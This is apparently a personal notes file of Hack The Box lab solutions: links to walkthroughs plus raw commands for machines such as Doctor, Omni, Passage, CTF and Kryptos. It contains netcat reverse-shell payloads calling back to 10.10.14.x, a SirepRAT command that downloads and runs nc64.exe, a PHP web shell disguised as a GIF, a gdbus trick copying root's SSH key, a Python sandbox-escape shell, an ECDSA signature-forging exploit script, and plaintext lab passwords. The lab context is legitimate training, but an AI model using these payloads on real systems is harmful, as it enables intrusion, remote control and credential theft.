Blunder
https://ethicalhacs.com/blunder-hackthebox-walkthrough/

Lame
https://medium.com/bugbountywriteup/htb-lame-writeup-e47100aea88b
https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/

Legacy
https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/
https://medium.com/@ranakhalil101/hack-the-box-legacy-writeup-w-o-metasploit-2d552d688336

Admirer
https://atsika.info/htb-admirer/

Dlevel
https://medium.com/@ranakhalil101/hack-the-box-devel-writeup-w-o-metasploit-88cc812794f1

FUSE
tabby
https://phantominfosec.wordpress.com/2020/07/08/htb-tabby-walkthrough/

P.O.O HTB Endgame
https://0xdf.gitlab.io/2020/06/08/endgame-poo.html#local-enumeration


Shocker
https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-shocker/


Nest
https://atm-infosec.github.io/hackthebox/2020/06/05/HTB-Nest.html

Jail
https://reboare.github.io/htb/htb-jail.html
https://medium.com/@gabriel.pirjolescu/hack-the-box-jail-write-up-e279862155d4


https://blog.csdn.net/qq_32261191


Travexec
https://resources.infosecinstitute.com/hack-the-box-htb-walkthrough-traverxec/

Zero Logon
https://0xdf.gitlab.io/2020/09/17/zerologon-owning-htb-machines-with-cve-2020-1472.html


Doctor
https://www.youtube.com/watch?v=2BvuoWG_r9Y
 svn checkout svn://10.10.10.203
svn diff -r 2

git clone https://github.com/cnotin/SplunkWhisperer2.git
python PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.2 --username shaun --password Guitar123 --payload 'nc.traditional -e/bin/sh '10.10.14.2' '1234''



Omni Commands

python3 -m http.server 80

https://github.com/SafeBreach-Labs/SirepRAT

python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-WebRequest -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://10.10.14.2/nc64.exe" --v   

python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.2 1234 -e powershell.exe" --v  



cd WindowsPowershell\Modules\PackageManagement


type r.bat


net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz


 nc -nlvp 1236

C:\Windows\System32\spooldrivers\color\nc64.exe 10.10.14.2 1235 -e powershell.exe

$credential = Import-CliXml -Path U:\Users\app\user.txt 

 $credential = Import-CliXml -Path U:\Users\administrator\root.txt

$credential.GetNetworkCredential().Password


X11 exploit
https://zachgrace.com/training/x11/


Passage

image.php file
GIF8;                                                                                                                                                                                      
<?php system($_REQUEST['cmd']) ?>

10.10.10.206/CuteNews/uploads/avatar_abc123_image.php?cmd=nc 10.10.14.2 -e /bin/bash 1234

python3 -c 'import pty;pty.spawn("/bin/bash")'

ssh -i id_rsa nadav@passage
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/getting_root/id_rsa 
true 
<.ubuntu.USBCreator.image /root/.ssh/id_rsa /tmp/getting_root/id_rsa true 
()

ssh -i id_rsa root@passage

CTF
https://0xdf.gitlab.io/2019/07/20/htb-ctf.html

https://snovvcrash.rocks/2019/09/20/htb-ctf.html



curl -sv --stderr - 10.10.10.122 | grep Date; date

touch '@me'; ln -sf /root/root.txt me; ls -la; date

otp.py
import time
from datetime import datetime
from subprocess import check_output

import requests

URL = 'http://10.10.10.122'

while True:
        kali = datetime.utcnow()
        server = datetime.strptime(requests.head(URL).headers['Date'], '%a, %d %b %Y %X %Z')
        offset = int((server - kali).total_seconds())

        cmd = [
                'stoken',
                '--token=285449490011357156531651545652335570713167411445727140604172141456711102716717000',
                '--pin=0000',
                f'--use-time={"%+d" % offset}'
        ]

        print(check_output(cmd).decode().strip(), end='\r')
        time.sleep(1)


krypto
ssh -L 81:127.0.0.1:81 rijndael@10.10.10.129 -f -N

python3 e.py 500 "{}.__class__.__mro__[1].__subclasses__()[121].__init__.__globals__['__builtins__']['__import__']('os').system('rm -f /tmp/p; mknod /tmp/p p; /bin/bash </tmp/p | nc 10.10.14.36 1234 >/tmp/p')"

import random
import json   
import hashlib
import binascii
from ecdsa import VerifyingKey, SigningKey, NIST384p
import base64
import requests
import sys

# not-so-secure PRNG ;)
def secure_rng(seed):
  # Taken from the internet - probably secure
  p = 2147483647
  g = 2255412

  keyLength = 32
  ret = 0
  ths = round((p-1)/2)
  for i in range(keyLength*8):
    seed = pow(g,seed,p)
    if seed > ths:
      ret += 2**i
  return ret

# sign
def sign(sk, msg):
    return binascii.hexlify(sk.sign(msg))

# Generate n not-so-secure random numbers
def generate_randoms(n):
  randoms = []
  for _ in range(n):
    seed = random.getrandbits(128)
    rand = secure_rng(seed) + 1
    randoms.append(rand)
  return randoms

# generate signing keys
def generate_keys(x):
  keys = []
  for _ in x:
    sk = SigningKey.from_secret_exponent(_, curve=NIST384p)
    keys.append(sk)
  return keys

# generate not-so-secure random numbers
n = int(sys.argv[1])
print("[+] Generating %d not-so-secure random numbers" % n)
random_numbers = generate_randoms(n)
unique_numbers = list(set(random_numbers))
print("[+] We got %d unique numbers" % len(unique_numbers))

# generate signing keys
print("[+] Generating signing keys from unique numbers")
keys = generate_keys(unique_numbers)

# Here goes nothing...
expr = sys.argv[2] # change this to a malicious expression
print("[+] Expression: %s" % expr)

for key in keys:
  json = {'expr': expr, "sig": sign(key, str.encode(expr)).decode()}
  headers = {'Content-Type': 'application/json'}
  r = requests.post('http://127.0.0.1:81/eval', json=json, headers=headers)

  if "Bad" not in r.text and "Error" not in r.text:
    print (r.text)
    exit()

https://hackso.me/kryptos-htb-walkthrough/


Jerry
https://brainweapons.com/2020/06/05/jerry-htb-series/

Blue
ms13-070

Travel
https://0xdf.gitlab.io/2020/09/12/htb-travel.html

Quick
https://0xprashant.github.io/posts/htb-quick/

Optimum
https://ech1.netlify.app/htb/easy/5
